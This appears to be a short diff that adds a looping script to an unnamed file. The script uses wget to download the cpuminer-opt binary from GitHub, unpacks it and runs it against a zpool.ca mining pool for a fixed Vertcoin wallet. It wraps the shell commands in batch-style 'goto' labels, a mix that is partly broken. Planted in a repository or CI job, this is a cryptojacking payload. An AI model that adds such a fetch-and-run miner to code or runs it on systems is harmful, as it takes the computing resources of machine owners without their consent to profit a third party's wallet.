@@ -1,0 +1,3 @@
+:start
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.21/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u vtc1qe8durytk7e9hnt7qyl0d3uahg64npwhcqha5lp -p c=VTC -a lyra2z330
+goto start
